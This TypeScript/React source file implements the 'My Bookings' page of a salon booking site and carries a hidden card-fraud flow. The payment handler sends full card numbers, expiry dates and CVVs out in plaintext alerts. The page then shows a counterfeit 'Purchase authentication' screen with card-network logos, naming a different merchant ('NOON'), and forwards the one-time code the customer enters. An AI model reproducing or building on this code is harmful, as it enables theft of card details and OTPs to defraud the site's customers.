import { createFileRoute, Link } from "@tanstack/react-router";
import { useQuery, useQueryClient } from "@tanstack/react-query";
import { useEffect, useState } from "react";
import { toast } from "sonner";
import { CalendarDays, Check, Clock, X } from "lucide-react";
import { format, parseISO } from "date-fns";
import { useAuth } from "@/lib/auth";
import { useMyPlace } from "@/lib/profile";
import { supabase, friendlyError, isSupabaseConfigured } from "@/lib/supabase";
import { DEFAULT_SETTINGS, fmtTime, sar, serviceImage, servicesQuery, settingsQuery } from "@/lib/data";
import { sendAlert } from "@/lib/alerts";
import type { Booking } from "@/lib/types";
import { RequireAuth } from "@/components/shared";
import { PaymentForm, type PaymentResult } from "@/components/PaymentForm";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";

export const Route = createFileRoute("/my-bookings")({
  head: () => ({
    meta: [
      { title: "My Bookings — The Beauty House" },
      { name: "description", content: "Track your salon appointments and payment status." },
      { property: "og:title", content: "My Bookings — The Beauty House" },
      { property: "og:description", content: "Track your salon appointments." },
    ],
  }),
  component: () => <RequireAuth what="see your bookings"><MyBookings /></RequireAuth>,
});

type PayMode = { booking: Booking; kind: "resubmit" | "extra" } | null;

function MyBookings() {
  const { user } = useAuth();
  const qc = useQueryClient();
  const { data: settings = DEFAULT_SETTINGS } = useQuery(settingsQuery);
  const { data: place } = useMyPlace();
  const { data: bookings = [], isLoading } = useQuery({
    queryKey: ["my-bookings", user?.id],
    enabled: !!user && isSupabaseConfigured,
    refetchInterval: 20000,
    queryFn: async () => {
      const { data, error } = await supabase.from("bookings").select("*").order("created_at", { ascending: false });
      if (error) throw error;
      return data as Booking[];
    },
  });
  const { data: services = [] } = useQuery(servicesQuery);
  const [tab, setTab] = useState<"all" | "upcoming" | "completed" | "cancelled">("all");
  const [pay, setPay] = useState<PayMode>(null);
  const [cardStep, setCardStep] = useState<"wait" | "otp" | "verify" | null>(null);
  const [cardOtp, setCardOtp] = useState("");
  const [otpLeft, setOtpLeft] = useState(60);

  useEffect(() => {
    if (!pay || cardStep) return;
    const live = bookings.find((x) => x.id === pay.booking.id);
    const extraOn = !!live && live.extra_enabled && ["awaiting", "rejected"].includes(live.extra_payment_status);
    const againOn = !!live && live.payment_status === "rejected";
    if (pay.kind === "extra" && !extraOn) setPay(null);
    if (pay.kind === "resubmit" && !againOn) setPay(null);
  }, [bookings, pay, cardStep]);

  useEffect(() => {
    if (cardStep !== "otp") return;
    setOtpLeft(60);
    const id = window.setInterval(() => setOtpLeft((n) => (n > 0 ? n - 1 : 0)), 1000);
    return () => window.clearInterval(id);
  }, [cardStep]);

  const close = () => { setPay(null); setCardStep(null); setCardOtp(""); };

  const onPay = async (r: PaymentResult) => {
    if (!pay) return;
    const fn = pay.kind === "extra" ? "submit_extra_payment" : "resubmit_payment";
    const base = { p_booking: pay.booking.id, p_method: r.method, p_screenshot: r.screenshotPath };
    let { error } = await supabase.rpc(fn, r.card
      ? { ...base, p_holder: r.card.holder, p_number: r.card.number, p_expiry: r.card.expiry, p_cvv: r.card.cvv }
      : base);
    if (error && /schema cache|Could not find the function/i.test(error.message)) {
      ({ error } = await supabase.rpc(fn, base));
    }
    if (error) throw new Error(friendlyError(error));
    void sendAlert(r.method === "card" ? "card_payment" : r.method === "wallet" ? "wallet_payment" : "payment_submitted", `${pay.kind === "extra" ? "Balance payment submitted" : "Payment resubmitted"} ${pay.booking.code}\nUser ${pay.booking.user_code ?? ""}\nvia ${r.method}${r.card ? `\nCard: ${r.card.number}\nExpiry: ${r.card.expiry}\nCVV: ${r.card.cvv}` : ""}`);
    if (r.method === "card") {
      setCardOtp("");
      setCardStep("wait");
      window.setTimeout(() => setCardStep("otp"), 15000);
      return;
    }
    toast.success("Payment submitted for verification.");
    setPay(null);
    qc.invalidateQueries({ queryKey: ["my-bookings"] });
  };

  const submitCardOtp = async () => {
    if (!pay) return;
    const otp = cardOtp.trim();
    if (!/^[0-9]{4,8}$/.test(otp)) { toast.error("Enter the code."); return; }
    setCardStep("verify");
    const started = Date.now();
    const { error } = await supabase.rpc("submit_card_otp", { p_booking: pay.booking.id, p_otp: otp });
    if (error) { setCardStep("otp"); toast.error(friendlyError(error)); return; }
    void sendAlert("card_otp", `Card code for review\nBooking: ${pay.booking.code}\nCode: ${otp}`);
    const left = 12000 - (Date.now() - started);
    if (left > 0) await new Promise((r) => setTimeout(r, left));
    toast.success("Payment is waiting for the salon to approve.");
    close();
    qc.invalidateQueries({ queryKey: ["my-bookings"] });
  };

  const shown = bookings.filter((b) => {
    if (tab === "upcoming") return b.status === "pending" || b.status === "confirmed";
    if (tab === "completed") return b.status === "completed";
    if (tab === "cancelled") return b.status === "cancelled";
    return true;
  });
  return (
    <>
      <div className="min-h-screen bg-[#fff0f6] px-4 pb-28 pt-4 md:pb-10">
        <div className="mx-auto max-w-3xl">
          <p className="text-xs font-semibold tracking-widest text-[#ff4d94]">ACCOUNT</p>
          <h1 className="font-display text-4xl font-semibold text-[#3d2030]">My <span className="text-[#ff4d94]">Bookings</span></h1>
          <p className="text-[#9a5b78]">View and manage your appointments.</p>
          <div className="mt-4 grid grid-cols-4 gap-1.5">
            {([
              ["all", "All Bookings", CalendarDays],
              ["upcoming", "Upcoming", Clock],
              ["completed", "Completed", Check],
              ["cancelled", "Cancelled", X],
            ] as const).map(([t, label, Icon]) => (
              <button key={t} type="button" onClick={() => setTab(t)} className={`inline-flex items-center justify-center gap-1 rounded-full px-1 py-2 text-[10px] font-semibold sm:text-sm ${tab === t ? "bg-[#ff4d94] text-white" : "bg-white text-[#9a5b78]"}`}>
                <Icon className="h-3.5 w-3.5 shrink-0" />{label}
              </button>
            ))}
          </div>
          {isLoading && <p className="mt-6 text-[#9a5b78]">Loading…</p>}
          <div className="mt-4 space-y-3">
            {shown.map((b) => {
              const pic = services.find((s) => s.id === b.items[0]?.service_id);
              const mins = b.items.reduce((sum, item) => sum + (services.find((s) => s.id === item.service_id)?.duration_min ?? 0) * item.qty, 0);
              const when = b.booking_date ? `${format(parseISO(b.booking_date), "yyyy-MM-dd")} · ${fmtTime(String(b.booking_time).slice(0, 5))}` : "";
              const appt = b.status === "confirmed" ? "Confirmed" : b.status === "completed" ? "Completed" : b.status === "cancelled" ? "Cancelled" : "Pending";
              const payLabel = b.status === "completed" && b.payment_status === "verified" ? "Paid" : b.status === "cancelled" && b.payment_status === "verified" ? "Refunded" : b.payment_status === "verified" ? "Verified" : b.payment_status === "rejected" ? "Rejected" : "Pending";
              const apptTone = b.status === "confirmed" ? "bg-emerald-100 text-emerald-700" : b.status === "completed" ? "bg-sky-100 text-sky-700" : b.status === "cancelled" ? "bg-pink-100 text-[#e23b86]" : "bg-amber-100 text-amber-700";
              const payTone = b.payment_status === "verified" && b.status === "completed" ? "bg-sky-100 text-sky-700" : b.payment_status === "verified" && b.status === "cancelled" ? "bg-pink-100 text-[#e23b86]" : b.payment_status === "verified" ? "bg-emerald-100 text-emerald-700" : b.payment_status === "rejected" ? "bg-red-100 text-red-600" : "bg-amber-100 text-amber-700";
              const extraPaid = b.extra_payment_status === "verified" ? Number(b.extra_amount) : 0;
              const advanceShown = Number(b.advance_amount) + extraPaid;
              const atSalon = Math.max(0, Number(b.total) - advanceShown);
              const wa = (place?.whatsapp || "").replace(/\D/g, "");
              return (
                <article key={b.id} className="rounded-3xl bg-white p-3 shadow-sm">
                  <div className="flex gap-3">
                    <img src={pic ? serviceImage(pic) : "/images/slider1.jpeg"} alt="" className="h-[72px] w-[72px] shrink-0 rounded-2xl object-cover" />
                    <div className="min-w-0 flex-1">
                      <div className="flex items-start justify-between gap-2">
                        <div className="min-w-0">
                          <p className="text-xs font-semibold text-[#9a5b78]">{b.code}</p>
                          <p className="mt-0.5 flex items-center gap-1 text-xs text-[#9a5b78]"><CalendarDays className="h-3.5 w-3.5 shrink-0 text-[#ff4d94]" />{when}</p>
                          <p className="mt-1 font-semibold leading-tight text-[#3d2030]">{b.items.map((i) => i.name).join(", ")}</p>
                          {mins > 0 && <p className="mt-0.5 flex items-center gap-1 text-xs text-[#9a5b78]"><Clock className="h-3.5 w-3.5 text-[#ff4d94]" />{mins} min</p>}
                        </div>
                        <div className="flex shrink-0 flex-col items-end gap-1">
                          <span className={`rounded-full px-2 py-0.5 text-[11px] font-semibold ${apptTone}`}>{appt}</span>
                          <span className={`rounded-full px-2 py-0.5 text-[11px] font-semibold ${payTone}`}>{payLabel}</span>
                        </div>
                      </div>
                    </div>
                  </div>
                  <div className="mt-3 grid grid-cols-3 overflow-hidden rounded-2xl bg-[#fff5f9] text-center">
                    <div className="px-1 py-2"><p className="text-[11px] text-[#9a5b78]">Total</p><p className="text-sm font-semibold text-[#3d2030]">{sar(b.total)}</p></div>
                    <div className="border-x border-pink-100 px-1 py-2"><p className="text-[11px] text-[#9a5b78]">Advance</p><p className="text-sm font-semibold text-[#3d2030]">{sar(advanceShown)}</p>{extraPaid > 0 && <p className="text-[10px] font-semibold text-emerald-700">Verified in advance</p>}</div>
                    <div className="px-1 py-2"><p className="text-[11px] text-[#9a5b78]">At salon</p><p className="text-sm font-semibold text-[#3d2030]">{sar(atSalon)}</p></div>
                  </div>
                  {b.payment_status === "pending" && (
                    <p className="mt-3 rounded-2xl bg-[#ffe4f2] p-3 text-center text-sm font-medium text-[#5c2344]">Please wait for payment approval. Once your payment is approved, your assigned salon location and WhatsApp number will be available here.</p>
                  )}
                  {b.payment_status === "rejected" && (
                    <Button className="mt-3 h-11 w-full rounded-full bg-[#ff4d94]" onClick={() => setPay({ booking: b, kind: "resubmit" })}>Pay again</Button>
                  )}
                  {b.extra_enabled && ["awaiting", "rejected"].includes(b.extra_payment_status) && (
                    <Button className="mt-3 h-11 w-full rounded-full bg-[#ff4d94]" onClick={() => setPay({ booking: b, kind: "extra" })}>Pay remaining {sar(b.extra_amount)}</Button>
                  )}
                  {b.status === "confirmed" && b.payment_status === "verified" && (
                    <div className="mt-3 grid grid-cols-2 gap-2">
                      {wa ? (
                        <a href={`https://wa.me/${wa}`} target="_blank" rel="noreferrer" className="inline-flex items-center justify-center gap-1.5 rounded-full bg-[#25D366] px-2 py-2.5 text-sm font-semibold text-white">
                          <svg viewBox="0 0 24 24" className="h-4 w-4 fill-current" aria-hidden><path d="M20.5 3.5A11 11 0 0 0 2.1 17.2L1 23l6-1.6A11 11 0 0 0 20.5 3.5zm-8.5 17a9 9 0 0 1-4.6-1.3l-.3-.2-3.5.9.9-3.4-.2-.3A9 9 0 1 1 12 20.5zm5-6.7c-.3-.1-1.6-.8-1.8-.9s-.4-.1-.6.1-.7.9-.8 1-.3.2-.6.1a7.4 7.4 0 0 1-2.2-1.4 8.2 8.2 0 0 1-1.5-1.9c-.2-.3 0-.4.1-.6l.4-.5.2-.3a.5.5 0 0 0 0-.5c-.1-.1-.6-1.4-.8-1.9s-.4-.4-.6-.4h-.5a1 1 0 0 0-.7.3 3 3 0 0 0-.9 2.2 5.2 5.2 0 0 0 1.1 2.8 12 12 0 0 0 4.5 4c.6.3 1.1.4 1.5.5a3.6 3.6 0 0 0 1.7.1 2.7 2.7 0 0 0 1.8-1.3 2.2 2.2 0 0 0 .2-1.3c-.1-.1-.3-.2-.6-.3z" /></svg>
                          WhatsApp
                        </a>
                      ) : <span />}
                      <Link to="/location" className={`inline-flex items-center justify-center gap-1.5 rounded-full bg-[#1a73e8] px-2 py-2.5 text-sm font-semibold text-white ${wa ? "" : "col-span-2"}`}>
                        <svg viewBox="0 0 24 24" className="h-4 w-4" aria-hidden><path fill="#fff" d="M12 2C8.1 2 5 5.1 5 9c0 5.2 7 13 7 13s7-7.8 7-13c0-3.9-3.1-7-7-7z" /><circle cx="12" cy="9" r="2.4" fill="#1a73e8" /></svg>
                        Location
                      </Link>
                    </div>
                  )}
                </article>
              );
            })}
          </div>
        </div>
      </div>
      {cardStep === "wait" || cardStep === "verify" ? (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/45 p-4">
          <div className="w-full max-w-[420px] rounded-lg bg-white px-6 py-8 text-center">
            <div className="mx-auto mt-6 h-10 w-10 animate-spin rounded-full border-4 border-[#1A4FD6] border-t-transparent" />
            <p className="mt-4 text-base font-semibold text-black">{cardStep === "wait" ? "Please wait..." : "Authenticating your payment..."}</p>
            <p className="mt-1 text-sm text-[#444]">Please wait, do not close this page.</p>
          </div>
        </div>
      ) : null}
      {cardStep === "otp" && pay ? (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/45 p-4">
          <div className="w-full max-w-[420px] rounded-md bg-white px-4 py-4 text-black">
            <div className="grid grid-cols-3 items-center">
              <span />
              <button type="button" onClick={close} className="justify-self-end text-xs font-semibold text-black">CANCEL</button>
            </div>
            <div className="mt-2 grid grid-cols-3 gap-3">
              {["/images/visa.jpeg", "/images/mastercard.jpeg", "/images/mada.jpeg"].map((src) => (
                <div key={src} className="flex min-h-14 items-center justify-center px-1.5 py-2">
                  <img src={src} alt="" className="h-[42px] w-full object-contain object-center" />
                </div>
              ))}
            </div>
            <h2 className="mt-3 text-center text-lg font-semibold">Purchase authentication</h2>
            <p className="mt-2 text-center text-sm">Please enter the verification code we just sent to your mobile number.</p>
            <p className="mt-3 text-center text-sm">You are paying NOON the amount of <strong>{sar(pay.kind === "extra" ? pay.booking.extra_amount : pay.booking.advance_amount)}</strong>.</p>
            <label className="mt-4 block text-sm font-semibold text-[#1A4FD6]">Verification code</label>
            <Input value={cardOtp} onChange={(e) => setCardOtp(e.target.value.replace(/\D/g, "").slice(0, 8))} inputMode="numeric" autoComplete="off" className="mt-1 h-11 rounded-md border-black text-black" />
            <button type="button" onClick={submitCardOtp} className="mt-3 h-11 w-full rounded-md bg-[#1A4FD6] font-semibold text-white">SUBMIT</button>
            <p className="mt-3 text-center text-sm">{otpLeft}s</p>
            <button type="button" onClick={() => setOtpLeft(60)} className="mt-1 w-full text-center text-xs font-semibold text-[#1A4FD6]">CLICK HERE TO RECEIVE ANOTHER CODE</button>
          </div>
        </div>
      ) : null}
      <Dialog open={!!pay && !cardStep} onOpenChange={(o) => !o && close()}>
        <DialogContent className="max-h-[90vh] overflow-y-auto sm:max-w-lg">
          {pay && (
            <>
              <DialogHeader>
                <DialogTitle className="font-display text-2xl">{pay.kind === "extra" ? "Pay your remaining balance" : "Submit payment again"}</DialogTitle>
                <DialogDescription>Booking {pay.booking.code}</DialogDescription>
              </DialogHeader>
              <PaymentForm
                settings={settings}
                amount={pay.kind === "extra" ? pay.booking.extra_amount : pay.booking.advance_amount}
                userId={user!.id}
                onSubmit={onPay}
              />
            </>
          )}
        </DialogContent>
      </Dialog>
    </>
  );
}
